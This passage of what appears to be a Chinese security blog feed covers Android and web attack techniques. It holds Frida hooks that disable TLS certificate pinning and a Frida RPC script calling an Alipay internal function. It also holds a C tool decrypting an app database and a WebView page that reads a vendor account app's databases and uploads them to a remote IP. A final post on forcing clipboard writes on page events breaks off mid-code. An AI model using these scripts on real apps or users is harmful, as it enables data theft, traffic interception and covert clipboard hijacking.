因此，通过hookSSLcontext的init函数，传递一个没有内容的TrustManager即可绕过，DroidSSLUnpinning的绕过代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// Prepare the TrustManagers array to pass to SSLContext.init()var X509Certificate = Java.use(&quot;java.security.cert.X509Certificate&quot;);var TrustManager;try &#123; TrustManager = Java.registerClass(&#123; name: &apos;org.wooyun.TrustManager&apos;, implements: [X509TrustManager], methods: &#123; checkClientTrusted: function (chain, authType) &#123; &#125;, checkServerTrusted: function (chain, authType) &#123; &#125;, getAcceptedIssuers: function () &#123; // var certs = [X509Certificate.$new()]; // return certs; return []; &#125; &#125; &#125;);&#125; catch (e) &#123; quiet_send(&quot;registerClass from X509TrustManager &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);&#125;// Prepare the TrustManagers array to pass to SSLContext.init()var TrustManagers = [TrustManager.$new()];try &#123; // Prepare a Empty SSLFactory var TLS_SSLContext = SSLContext.getInstance(&quot;TLS&quot;); TLS_SSLContext.init(null,TrustManagers,null); var EmptySSLFactory = TLS_SSLContext.getSocketFactory();&#125; catch (e) &#123; quiet_send(e.message);&#125;// hook init() of SSLContextvar SSLContext = Java.use(&apos;javax.net.ssl.SSLContext&apos;);var SSLContext_init = SSLContext.init.overload( &apos;[Ljavax.net.ssl.KeyManager;&apos;, &apos;[Ljavax.net.ssl.TrustManager;&apos;, &apos;java.security.SecureRandom&apos;);// Override the init method, specifying our new TrustManagerSSLContext_init.implementation = function (keyManager, trustManager, secureRandom) &#123; quiet_send(&apos;Overriding SSLContext.init() with the custom TrustManager&apos;); SSLContext_init.call(this, null, TrustManagers, null);&#125;; （2）使用Okhttp的CertificatePinner绑定域名和证书的hash123456789val certificatePinner = CertificatePinner.Builder() .add( &quot;www.example.com&quot;, &quot;sha256/ZC3lTYTDBJQVf1P2V7+fibTqbIsWNR/X7CWNVW+CEEA=&quot; ).build()val okHttpClient = OkHttpClient.Builder() .certificatePinner(certificatePinner) .build() DroidSSLUnpinning的绕过代码如下：123456789101112131415161718192021222324252627282930/*** okhttp3.x unpinning ***/var CertificatePinner = Java.use(&apos;okhttp3.CertificatePinner&apos;); quiet_send(&apos;OkHTTP 3.x Found&apos;); CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;java.util.List&apos;).implementation = function () &#123; quiet_send(&apos;OkHTTP 3.x check() called. Not throwing an exception.&apos;); &#125; /*** okhttp unpinning ***/ var OkHttpClient = Java.use(&quot;com.squareup.okhttp.OkHttpClient&quot;); OkHttpClient.setCertificatePinner.implementation = function(certificatePinner)&#123; // do nothing quiet_send(&quot;OkHttpClient.setCertificatePinner Called!&quot;); return this; &#125;; // Invalidate the certificate pinnet checks (if &quot;setCertificatePinner&quot; was called before the previous invalidation) var CertificatePinner = Java.use(&quot;com.squareup.okhttp.CertificatePinner&quot;); CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;[Ljava.security.cert.Certificate;&apos;).implementation = function(p0, p1)&#123; // do nothing quiet_send(&quot;okhttp Called! [Certificate]&quot;); return; &#125;; CertificatePinner.check.overload(&apos;java.lang.String&apos;, &apos;java.util.List&apos;).implementation = function(p0, p1)&#123; // do nothing quiet_send(&quot;okhttp Called! [List]&quot;); return; &#125;; （3）Manifest中配置networkSecurityConfig（Android 7.0以上） 创建res/xml/network_security_config.xml，并在 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;network-security-config&gt; &lt;domain-config&gt; &lt;domain includeSubdomains=&quot;true&quot;&gt;example.com&lt;/domain&gt; &lt;pin-set&gt; &lt;pin digest=&quot;SHA-256&quot;&gt;ZC3lTYTDBJQVf1P2V7+fibTqbIsWNR/X7CWNVW+CEEA=&lt;/pin&gt; &lt;pin digest=&quot;SHA-256&quot;&gt;GUAL5bejH7czkXcAeJ0vCiRxwMnVBsDlBMBsFtfLF8A=&lt;/pin&gt; &lt;/pin-set&gt; &lt;/domain-config&gt;&lt;/network-security-config&gt; 在manifest.xml文件中添加配置 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;co.netguru.demoapp&quot;&gt; &lt;application android:networkSecurityConfig=&quot;@xml/network_security_config&quot;&gt; ... &lt;/application&gt;&lt;/manifest.. DroidSSLUnpinning的绕过代码如下：12345678910var TrustManagerImpl = Java.use(&quot;com.android.org.conscrypt.TrustManagerImpl&quot;);TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) &#123; quiet_send(&quot;TrustManagerImpl verifyChain called&quot;); return untrustedChain;&#125;var OpenSSLSocketImpl = Java.use(&apos;com.android.org.conscrypt.OpenSSLSocketImpl&apos;);OpenSSLSocketImpl.verifyCertificateChain.implementation = function (certRefs, authMethod) &#123; quiet_send(&apos;OpenSSLSocketImpl.verifyCertificateChain&apos;);&#125; （4）WebView绑定证书在WebViewClient类中的onReceivedSslError回调中实现校验逻辑 代码来自https://blog.csdn.net/lsyz0021/article/details/5466991412345678910111213141516171819202122232425262728293031323334353637381.实现证书校验函数 public static boolean isSSLCertOk(SslCertificate cert, String sha256Str) &#123; byte[] SSLSHA256 = hexToBytes(sha256Str); Bundle bundle = SslCertificate.saveState(cert); if (bundle != null) &#123; byte[] bytes = bundle.getByteArray(&quot;x509-certificate&quot;); if (bytes != null) &#123; try &#123; CertificateFactory cf = CertificateFactory.getInstance(&quot;X.509&quot;); Certificate ca = cf.generateCertificate(new ByteArrayInputStream(bytes)); MessageDigest sha256 = MessageDigest.getInstance(&quot;SHA-256&quot;); byte[] key = sha256.digest(((X509Certificate) ca).getEncoded()); return Arrays.equals(key, SSLSHA256); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; return false;2.onReceivedSslError回调中调用校验函数webView.setWebViewClient(new WebViewClient() &#123; @Override public void onReceivedSslErroronReceivedSslError回调中实现校验逻辑(WebView view, SslErrorHandler handler, SslError error) &#123; if (error.getPrimaryError() == SslError.SSL_INVALID) &#123; // 如果手动校验sha256成功就允许加载页面 if (SSLCertUtil.isSSLCertOk(error.getCertificate(), &quot;6683c9584b8287ec3a50e312f4a540c79938aaeb76bd02e40a9ca037ee5d24f4&quot;)) &#123; handler.proceed();//验证通过 &#125; else &#123; //证书验证失败 &#125; &#125; else &#123; handler.cancel(); &#125; &#125;&#125;); DroidSSLUnpinning的绕过代码如下：123456789101112131415161718var WebViewClient = Java.use(&quot;android.webkit.WebViewClient&quot;);WebViewClient.onReceivedSslError.implementation = function (webView,sslErrorHandler,sslError)&#123; quiet_send(&quot;WebViewClient onReceivedSslError invoke&quot;); //执行proceed方法 sslErrorHandler.proceed(); return ;&#125;;WebViewClient.onReceivedError.overload(&apos;android.webkit.WebView&apos;, &apos;int&apos;, &apos;java.lang.String&apos;, &apos;java.lang.String&apos;).implementation = function (a,b,c,d)&#123; quiet_send(&quot;WebViewClient onReceivedError invoked&quot;); return ;&#125;;WebViewClient.onReceivedError.overload(&apos;android.webkit.WebView&apos;, &apos;android.webkit.WebResourceRequest&apos;, &apos;android.webkit.WebResourceError&apos;).implementation = function ()&#123; quiet_send(&quot;WebViewClient onReceivedError invoked&quot;); return ;&#125;; 还有其他几种用法这里不再一一介绍，详情可以参考DroidSSLUnpinning的代码注释部分。 3. https双向证书校验https双向校验是指APP除了校验服务端的证书，服务端还会校验APP的证书。对于双向校验。https双向证书校验在实际中几乎很少用到，因为服务器端需要维护所有客户端的证书，这无疑增加了很多消耗，因此大部分厂商选择使用单向证书绑定。 双向认证需要完成两个环节： (1)让客户端认为burp是服务端这一步其实就是破解Certificate Pinning，方法和上述过程完全相同。 (2)让服务端认为burp是客户端这一步需要导入客户端的证书到burp,客户端的证书一定会存在本地代码中，而且还可能会有密码，这种情况下需要逆向客户端app，找到证书和密码，并转为pkcs12格式导入到burp。 User options -&gt; SSL -&gt; Client SSL Certificate 这样下来就可以双向抓包了。 使用ssl_logger至此，我们可以绕过证书绑定，抓APP发出的https包了，然而上述的证书解绑hook工具仅仅是通过hook了几种绑定证书的API，不适用于新出现或者非主流的证书绑定技术。当折腾半天都搞不定证书绑定时，这时候就需要神器 —— ssl_logger。 ssl_logger(https://github.com/google/ssl_logger)是用来解密SSL流量的工具，它也是一款基于frida的hook工具，通过hook libssl库中的SSL_read、SSL_write等函数来实现流量解密。由于底层的实现会调用这几个函数来封装，所以可以直接解出流量数据。 全球知名黑客5alt大佬对ssl_logger进行了修改，使之在Android设备上的使用更加友好，参考 https://github.com/5alt/ssl_logger。 使用ssl_logger无需安装burp的中间人攻具的证书就可以抓https流量，但和burp相比，其重放、修改等功能会受限。 参考资料： https://github.com/WooyunDota/DroidSSLUnpinning https://xz.aliyun.com/t/2336 Frida.Android.Practice (ssl unpinning) https://xz.aliyun.com/t/2098 安卓证书锁定解除的工具 https://www.nevermoe.com/2018/11/20/openssl%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/ 安装Android自定义证书 https://blog.freessl.cn/ssl-cert-format-introduce/ SSL证书格式普及PEM、CER、JKS、PKCS12 https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/ 在Android Nougat中正确配置Burp Suite https://blog.nviso.be/2017/12/22/intercepting-https-traffic-from-apps-on-android-7-using-magisk-burp/ https://support.portswigger.net/customer/portal/questions/17281202-intercepting-android-version-8-1-https-traffic https://developer.android.com/training/articles/security-ssl#java https://xz.aliyun.com/t/2440 SSL Pinning Practice http://www.wisedream.net/2017/03/17/cryption/crack-mutual-auth/]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android加固厂商特征（转）]]></title>
    <url>%2F2018%2F02%2F28%2FAndroid%E5%8A%A0%E5%9B%BA%E5%8E%82%E5%95%86%E7%89%B9%E5%BE%81%EF%BC%88%E8%BD%AC%EF%BC%89%2F</url>
    <content type="text"><![CDATA[from https://bbs.pediy.com/thread-223248.htm 娜迦libchaosvmp.so , libddog.solibfdog.so 爱加密libexec.so, libexecmain.so，ijiami.dat 梆梆libsecexe.so, libsecmain.so,libSecShell.so 梆梆企业版libDexHelper.so , libDexHelper-x86.so360libprotectClass.so, libjiagu.solibjiagu.so, libjiagu_art.solibjiagu.so, libjiagu_x86.so 通付盾libegis.so，libNSaferOnly.so 网秦libnqshield.so 百度libbaiduprotect.so 阿里聚安全aliprotect.dat，libsgmain.so，libsgsecuritybody.solibsgmain.so、libsgsecuritybody.so 腾讯libtup.so, libexec.so，libshell.somix.dexlib/armeabi/mix.dex ,lib/armeabi/mixz.dex 腾讯御安全libtosprotection.armeabi.so，libtosprotection.armeabi-v7a.so，libtosprotection.x86.so 网易易盾libnesec.so APKProtectlibAPKProtect.so 几维安全libkwscmm.so, libkwscr.so, libkwslinker.so 顶像科技libx3g.so]]></content>
  </entry>
  <entry>
    <title><![CDATA[frida导出函数任意调用]]></title>
    <url>%2F2018%2F02%2F08%2Ffrida%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[除了hook外，frida提供了rpc接口，可以导出某一个指定的函数，实现随时对其进行调用。 1.js中指定导出的类和函数，并采用new方法创建一个实例，python文件中导入1.js,输入对应的参数调用即可。如果通过http的方式传递参数，就可以变为一个服务框架，例如salt写的Hrida。（https://github.com/5alt/hrida）123456789101112131415161718//1.js内容rpc.exports = &#123; myfunc: function(aa,bb,cc)&#123; Java.perform(function () &#123; try&#123; classf = Java.use('com.alipay.android.phone.wallet.sharetoken.service.f'); var result = classf.a(aa,bb,cc);//a为static函数 //f = Hrida.$new(); 非static函数需要new一个实例 console.log("myfunc result: "+result); return result &#125;catch(e)&#123; console.log(e) &#125; &#125;); //return result &#125;&#125; 1234567891011121314151617181920212223242526272829303132#coding:utf-8import time,osimport fridadef adb_forward(): os.system("adb forward tcp:27042 tcp:27042") os.system("adb forward tcp:27043 tcp:27043")def my_message_handler(message, payload): print message print payloadadb_forward()rdev = frida.get_remote_device()session = rdev.attach("com.eg.android.AlipayGphone")with open("1.js") as f: script = session.create_script(f.read())script.on("message", my_message_handler)script.load()command = ""while 1 == 1: command = raw_input("Enter command:\n9999: Exit\nothers: Call secret function\nchoice:") if command == "9999": break else: a = "b54578ff9d5fcbf6d26ecefced9a2cf27ea6b88d07328f338a31e4437c5caf9fe0fc44cf068c9196bd81412c70ad7b0dfc4e2c91c4d729509ef61e3a669897181ade46ef836b2e3404193fbeb074065384a17620c05afa7d7426c27b804cd108" b = None c = "快来吱付寳，赐我富强福，一起集五福迎新春！丹昂达菏P辰霆3勾闲岔FUdldo" script.exports.myfunc(a,b,c)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android直接执行so里的函数]]></title>
    <url>%2F2018%2F02%2F06%2FAndroid%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Cso%E9%87%8C%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;dlfcn.h&gt;int main(int argc, char *argv[])&#123; //decrypt_db in.db out.db key //char key_in[256] = "thMSot/QNM/iFsDVNksPtXHiqi0wxjD0m2SMLipLEQ4="; char *in_db = argv[1]; char *out_db = argv[2]; char *key_in = argv[3]; char key_out[256] = &#123;0&#125;; void *p; void (*key_func)(char *, char *); void (*decrypt)(char *, char *, char *); //dlopen p=dlopen("./libdatabase_sqlcrypto.so",RTLD_NOW); if(p==NULL) &#123; printf("dlopen error!\n"); exit(0); &#125; else printf("dlopen ok!\n"); //dlsym aes_decrypt_key128 key_func=dlsym(p, "aes_decrypt_key128"); key_func(key_in, key_out); //printf("key_in:%s\n", key_in); //printf("key_out:%s\n", key_out); char cipher[16] = &#123;0&#125;; char plain[16] = &#123;0&#125;; //read cipher FILE *fp_read; fp_read = fopen(in_db, "rb"); FILE *fp_write; fp_write = fopen(out_db, "wb"); //dlsym aes_decrypt decrypt=dlsym(p, "aes_decrypt"); while(fread(cipher, 1, 16, (FILE*)fp_read) == 16) //read cipher &#123; //decrypt decrypt(cipher, plain, key_out); //write plain fwrite(plain, 1, 16, (FILE*)fp_write); &#125; fclose(fp_read); fclose(fp_write); dlclose(p);&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[Ajax读取本地文件]]></title>
    <url>%2F2018%2F01%2F24%2FxmlHttpRequest%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[关于AjaxAJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。 所有现代浏览器均支持 XMLHttpRequest 对象（IE5 和 IE6 使用 ActiveXObject）。 XMLHttpRequest 用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。 关于XMLHttpRequest XMLHttpRequest两个方法 open(method,url,async) 规定请求的类型、URL 以及是否异步处理请求。 method：请求的类型；GET 或 POST url：文件在服务器上的位置 async：true（异步）或 false（同步） send(string)将请求发送到服务器。string：仅用于 POST 请求 onreadystatechange 事件 当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。readyState 属性存有 XMLHttpRequest 的状态信息。 在 onreadystatechange 事件中，我们规定当服务器响应已做好被处理的准备时所执行的任务。 当 readyState 等于 4 且状态为 200 时，表示响应已就绪： 1234567xmlhttp.onreadystatechange=function() &#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById("myDiv").innerHTML=xmlhttp.responseText; &#125; &#125; 以下为读取本地文件的代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html&gt;&lt;div id="info"&gt;Info will be listed as follow:&lt;/div&gt;&lt;script&gt; //start(); var out = document.getElementById("info") alert(111); alert(location); out.innerHTML+="&lt;br&gt;"; out.innerHTML+=location; out.innerHTML+="&lt;br&gt;"; var path = location;//自己读自己，在权限允许条件下path改为其他路径即可 var x = new XMLHttpRequest(); x.onreadystatechange = function() &#123; if (x.readyState === 4) &#123; if (x.status === 200) &#123; console.log(oXHR.responseText); out.innerHTML+="&lt;!-- "+x.response+" --&gt;"; //不注释的话，可能不显示js &#125; else &#123; out.innerHTML+="&lt;br&gt;readyState: "+x.readyState; out.innerHTML+="&lt;br&gt;status:&lt;br&gt;"+x.status; out.innerHTML+="&lt;br&gt;responseText: "+x.responseText+"&lt;br&gt;"; out.innerHTML+="&lt;br&gt;responseXML: "+x.responseXML+"&lt;br&gt;"; out.innerHTML+="&lt;br&gt;response:&lt;br&gt; "+"&lt;!-- "+x.response+" --&gt;"; &#125; &#125; /* //文件内容上传到远程服务器 //alert(x.response); var url = "http://118.89.200.48/jm/test1.php"; var xhr = new XMLHttpRequest(); xhr.open("POST", url, true); xhr.send(x.response); */ &#125;; x.open("GET", path, true); //x.responseType = 'arraybuffer'; x.send();&lt;/script&gt;&lt;/html&gt; 上传整个目录（Android&lt;8.0测试过）*注意这里需要指定responseType = ‘arraybuffer’;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091 &lt;script&gt; //读取单个文件function get(path)&#123; var x = new XMLHttpRequest(); x.open("GET", path, false); x.onload = function(e) &#123; return this.response; &#125;; x.send(null); return x.response;&#125;//发送单个文件function send(path,remoteUrl)&#123; var xhr = new XMLHttpRequest(); xhr.open('GET',path,true); xhr.responseType = 'arraybuffer'; xhr.onload = function(e) &#123; res = new Uint8Array(xhr.response) var xhr1 = new XMLHttpRequest(); xhr1.open('POST',remoteUrl,true); xhr1.send(res.buffer); &#125; xhr.send();&#125;//解析目录结构function parseText(text)&#123; var parent = ""; var lines = text.split("\n"); for(var i=0;i&lt;lines.length;i++) &#123; var line = lines[i].replace("&lt;script&gt;","").replace("&lt;\/script&gt;",""); if(line.substring(0,line.indexOf("(")) == "start") &#123; //first line parent = line.split("\"")[1]; //document.write("Scan --------"+parent+"--------:"+"&lt;br&gt;"); //alert(parent); &#125; if(line.substring(0,line.indexOf("(")) == "addRow") &#123; var file = line.split("\"")[1]; if (file =="..") continue; var type = line.split(",")[2]; if(type == "1")//mulu &#123; //alert("mulu:"+file); //alert("file://"+parent+file); //document.write("dir: "+parent+file+"&lt;br&gt;"); readDir("file://"+parent+file); continue; &#125; else//wen jian &#123; //alert("wenjian:"+file); //document.write("file: "+parent+file+"&lt;br&gt;"); remote = remoteUrl+"?filename="+parent+file; send("file://"+parent+file,remote); continue; &#125; //alert(parent+file); &#125; &#125;&#125;function readDir(dir)&#123; var res = get(dir); parseText(res);&#125;var path = "file:///data/data/com.bbk.account/databases/";var remoteUrl = "http://118.89.200.48/brute/all.php";readDir(path);&lt;/script&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[js直接在页面输出错误]]></title>
    <url>%2F2018%2F01%2F24%2Fjs%E8%BE%93%E5%87%BA%E9%94%99%E8%AF%AF%2F</url>
    <content type="text"><![CDATA[hook了window.onerror事件123456789101112131415161718192021222324252627282930313233343536&lt;script&gt;window.onerror = function (msg, url, lineNo, columnNo, error) &#123; var string = msg.toLowerCase(); var substring = "script error"; if (string.indexOf(substring) &gt; -1)&#123; //alert('Script Error: See Browser Console for Detail'); var message = [ 'Message: ' + msg, 'URL: ' + url, 'Line: ' + lineNo, 'Column: ' + columnNo, 'Error object: ' + JSON.stringify(error) ].join('\n'); alert('window.onerror: script error '+ message); &#125; else &#123; var message = [ 'Message: ' + msg, 'URL: ' + url, 'Line: ' + lineNo, 'Column: ' + columnNo, 'Error object: ' + JSON.stringify(error) ].join('\n'); if(msg.indexOf('SyntaxError') != -1 || msg.indexOf('Uncaught ReferenceError') != -1)&#123; console.log(message); alert('window.onerror: SyntaxError'+ message); &#125; &#125; return false;&#125;;&lt;/script&gt;&lt;script&gt;a=s2&lt;/script&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[apache搭建https站]]></title>
    <url>%2F2018%2F01%2F17%2Fapache%E6%90%AD%E5%BB%BAhttps%E7%AB%99%2F</url>
    <content type="text"><![CDATA[激活SSL模块 [html] view plain copysudo a2enmod ssl重启apache2[html] view plain copysudo service apache2 restart 2.创建自签名SSL证书 [html] view plain copysudo mkdir /etc/apache2/sslsudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt 3. 编辑配置文件，修改描红部分[html] view plain copysudo vim /etc/apache2/sites-available/default-ssl.conf[html] view plain copy ServerAdmin admin@example.com ServerName your_domain.com ServerAlias www.your_domain.com DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on SSLCertificateFile /etc/apache2/ssl/apache.crt SSLCertificateKeyFile /etc/apache2/ssl/apache.key SSLOptions +StdEnvVars SSLOptions +StdEnvVars BrowserMatch “MSIE [2-6]” \ nokeepalive ssl-unclean-shutdown \ downgrade-1.0 force-response-1.0 BrowserMatch “MSIE [17-9]” ssl-unclean-shutdown 4.激活SSL虚拟Host [html] view plain copysudo a2ensite default-ssl.conf重启apache2[html] view plain copysudo service apache2 restart 5.测试 [html] view plain copyhttps://server_domain_name_or_IP]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android WebView那些事儿]]></title>
    <url>%2F2018%2F01%2F17%2FWebView%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF%2F</url>
    <content type="text"><![CDATA[Android WebView经常会有一些奇奇怪怪的问题，为了避免日后重复采坑，统一在这里总结下： setWebContentsDebuggingEnabledsetWebContentsDebuggingEnabled()用来配置WebView是否支持远程调试，当被设置为true时，既可以用PC端的Chrome来调试手机端的WebView。具体操作如下： WebView配置如下 1234//KITKAT版本一下不支持这个APIif (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) &#123; WebView.setWebContentsDebuggingEnabled(true); &#125; 手机通过USB连接PC,在Chrome下输入”chrome://inspect”即可进入调试页，同时会显示出所有可调式的WebView页，审查元素、network等调试操作和PC上相同。 setWebChromeClient和setWebViewClient WebViewClient主要帮助WebView处理各种通知、请求事件的，比如：onLoadResource，onPageStart，onPageFinish，onReceiveError，onReceivedHttpAuthRequest 等。 WebChromeClient主要辅助WebView处理Javascript的对话框、网站图标、网站title、加载进度等，比如:onCloseWindow(关闭WebView)，onCreateWindow()，onJsAlert (WebView上alert无效，需要定制WebChromeClient处理弹出)，onJsPrompt，onJsConfirm，onProgressChanged，onReceivedIcon，onReceivedTitle 等等。 addjavascriptinterfaceaddjavascriptinterface可以把一个java对象导出，通过js来调用java对象。如果这个对象涉及到敏感操作，有可能产生安全问题。 使用实例如下： 定义一个AndroidToast，实现弹出一个toast功能，并将其导出123456public class AndroidToast &#123; @JavascriptInterface public void show(String str) &#123; Toast.makeText(MainActivity.this, str, Toast.LENGTH_SHORT).show(); &#125; &#125; WebView进行设置，开启JavaScipt，注册JavascriptInterface的方法123456789private void initView() &#123; webView = (WebView) findViewById(R.id.webView); WebSettings webSettings = webView.getSettings(); webSettings.setJavaScriptEnabled(true); webSettings.setDefaultTextEncodingName(&quot;UTF-8&quot;); webView.addJavascriptInterface(new AndroidToast(), &quot;AndroidToast&quot;); webView.loadUrl(&quot;file:///android_asset/index.html&quot;); &#125; 在javascript中调用方法，通过window属性可以找到映射的对象AndroidToast,直接调用它的show方法即可。123function toastClick()&#123; window.AndroidToast.show(&apos;from js&apos;);&#125; setGeolocationEnabledsetGeolocationEnabled用来配置是否允许H5定位，默认为true。通过一定的配置，可以使WebView中的H5定位时，用户不会受到任何定位提示。 参照官方开发文档，实现h5定位需要满足三个条件： APP本身必须具有定位权限 APP必须实现onGeolocationPermissionsShowPrompt(String, GeolocationPermissions.Callback) 这个回调函数，当js调用h5定位的API时，这个函数会被调用 发起定位请求的站点必须为可信origin,如https,http的将不允许定位 下边这行代码用来处理定位请求，第一个参数是发起定位请求的origin,第二个 boolean 类型的参数表示是否授予网页定位权限；而第三个 boolean 类型的参数则表示是否保留这个权限状态。1callback.invoke(origin, true, true); 具体代码如下：12345678910111213141516171819202122232425前端实现&lt;body&gt;&lt;p id="demo"&gt;点击按钮获取您当前坐标（可能需要比较长的时间获取）：&lt;/p&gt;&lt;button onclick="getLocation()"&gt;点我&lt;/button&gt;&lt;script&gt;var x=document.getElementById("demo");function getLocation()&#123; if (navigator.geolocation) &#123; navigator.geolocation.getCurrentPosition(showPosition); &#125; else &#123; x.innerHTML="该浏览器不支持获取地理位置。"; &#125;&#125;function showPosition(position)&#123; x.innerHTML="纬度: " + position.coords.latitude + "&lt;br&gt;经度: " + position.coords.longitude; &#125;&lt;/script&gt;&lt;/body&gt; 1234Manifest文件：&lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/&gt;&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;&lt;uses-permission android:name="android.permission.INTERNET"/&gt; 123456789101112WebView contentWv = (WebView) findViewById(R.id.wv_content);WebSettings settings = contentWv.getSettings();settings.setJavaScriptEnabled(true);//setGeolocationEnabled默认为truecontentWv.setWebChromeClient(new WebChromeClient()&#123; @Override public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) &#123; callback.invoke(origin, true, true); super.onGeolocationPermissionsShowPrompt(origin, callback); &#125;&#125;);contentWv.loadUrl("file:///android_asset/location.html"); 一般比较合适的做法是，在该回调函数中设置一个对话框，告知用户是否授权定位操作。12345678910111213141516171819202122232425wv.setWebChromeClient(new WebChromeClient()&#123;@Overridepublic void onGeolocationPermissionsShowPrompt(final String origin, final GeolocationPermissions.Callback callback) &#123; AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this); builder.setMessage("Allow to access location information?"); DialogInterface.OnClickListener dialogButtonOnClickListener = new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int clickedButton) &#123; if (DialogInterface.BUTTON_POSITIVE == clickedButton) &#123; callback.invoke(origin, true, true);//允许 &#125; else if (DialogInterface.BUTTON_NEGATIVE == clickedButton) &#123; callback.invoke(origin, false, false);//拒绝 &#125; &#125; &#125;; builder.setPositiveButton("Allow", dialogButtonOnClickListener); builder.setNegativeButton("Deny", dialogButtonOnClickListener); builder.show();&#125;&#125;);]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端使用JavaScript自动写入剪贴板]]></title>
    <url>%2F2018%2F01%2F12%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFJavaScript%E5%86%99%E5%85%A5%E5%89%AA%E8%B4%B4%E6%9D%BF%2F</url>
    <content type="text"><![CDATA[背景近期风靡的“吱口令”红包在互联网上铺天盖地，用户复制一段“吱口令”，打开支付宝就可以直接进入抢红包的页面。研究发现，支付宝是通过读取用户剪贴板数据，提取出吱口令，之后加载抢红包页面。 如果可以实现在用户打开某个网页的时候就写入剪贴板，那么用户会在不知不觉打开支付宝时，就会直接进入领取页面。因此，我们尝试了js自动写入剪贴板是否可行。 遍历js事件PC端似乎需要用户主动点击才能实现写入剪贴板，我们首先写一段写入剪贴板的代码12345678&lt;input type=&quot;text&quot; id=&quot;website&quot; value=&quot;tobecopydata&quot; /&gt;&lt;script&gt;function copy(e) &#123; website.select() document.execCommand(&apos;copy&apos;); &#125;&lt;/script&gt; 之后通过遍历js事件来触发复制操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// event handlerdocument.body.addEventListener('blur', copy, true);document.body.addEventListener('error', copy, true);document.body.addEventListener('focus', copy, true);document.body.addEventListener('load', copy, true);document.body.addEventListener('resize', copy, true);document.body.addEventListener('scroll', copy, true);document.body.addEventListener('afterprint', copy, true);document.body.addEventListener('beforeprint', copy, true);document.body.addEventListener('beforeunload', copy, true);document.body.addEventListener('hashchange', copy, true);document.body.addEventListener('languagechange', copy, true);document.body.addEventListener('message', copy, true);document.body.addEventListener('messageerror', copy, true);document.body.addEventListener('offline', copy, true);document.body.addEventListener('online', copy, true);document.body.addEventListener('pagehide', copy, true);document.body.addEventListener('pageshow', copy, true);document.body.addEventListener('popstate', copy, true);document.body.addEventListener('rejectionhandled', copy, true);document.body.addEventListener('storage', copy, true);document.body.addEventListener('unhandledrejection', copy, true);document.body.addEventListener('unload', copy, true);document.body.addEventListener('abort', copy, true);document.body.addEventListener('cancel', copy, true);document.body.addEventListener('canplay', copy, true);document.body.addEventListener('canplaythrough', copy, true);document.body.addEventListener('change', copy, true);document.body.addEventListener('click', copy, true);document.body.addEventListener('close', copy, true);document.body.addEventListener('contextmenu', copy, true);document.body.addEventListener('cuechange', copy, true);document.body.addEventListener('dblclick', copy, true);document.body.addEventListener('drag', copy, true);document.body.addEventListener('dragend', copy, true);document.body.addEventListener('dragenter', copy, true);document.body.addEventListener('dragleave', copy, true);document.body.addEventListener('dragover', copy, true);document.body.addEventListener('dragstart', copy, true);document.body.addEventListener('drop', copy, true);document.body.addEventListener('durationchange', copy, true);document.body.addEventListener('emptied', copy, true);document.body.addEventListener('ended', copy, true);document.body.addEventListener('input', copy, true);document.body.addEventListener('invalid', copy, true);document.body.addEventListener('keydown', copy, true);document.body.addEventListener('keypress', copy, true);document.body.addEventListener('keyup', copy, true);document.body.addEventListener('loadeddata', copy, true);document.body.addEventListener('loadedmetadata', copy, true);document.body.addEventListener('loadstart', copy, true);document.body.addEventListener('mousedown', copy, true);document.body.addEventListener('mouseenter', copy, true);document.body.addEventListener('mouseleave', copy, true);document.body.addEventListener('mousemove', 